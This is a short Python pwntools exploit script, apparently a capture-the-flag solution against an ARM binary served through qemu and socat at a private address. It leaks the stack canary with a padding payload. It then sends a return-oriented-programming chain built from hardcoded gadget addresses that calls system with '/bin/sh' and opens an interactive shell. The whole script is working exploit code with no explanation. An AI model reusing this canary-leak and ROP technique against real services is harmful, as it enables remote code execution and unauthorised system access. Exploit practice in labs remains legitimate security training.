from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('192.168.5.147', 10002)

payload = 'a' * 20

t.send(payload)
canary = u32(t.recvline()[36:40])
log.info('canary: ' + hex(canary))
pop_7 = 0x10804
mov_r0 = 0x107f4
binsh = 0x21044
addr_sys = 0x104FC
pop_pc = 0x104a8
payload2 = fit({0x18:[p32(canary),p32(0xdeadbeef),p32(pop_7),p32(0),p32(0),p32(0),p32(binsh),p32(0),p32(0),p32(0),p32(pop_pc),p32(addr_sys),p32(mov_r0)]})
t.send(payload2)
t.interactive()

# socat tcp-l:10002,fork exec:"qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn",reuseaddr

# socat tcp-l:10002,fork exec:"qemu-arm  -L /usr/arm-linux-gnueabi ./pwn",reuseaddr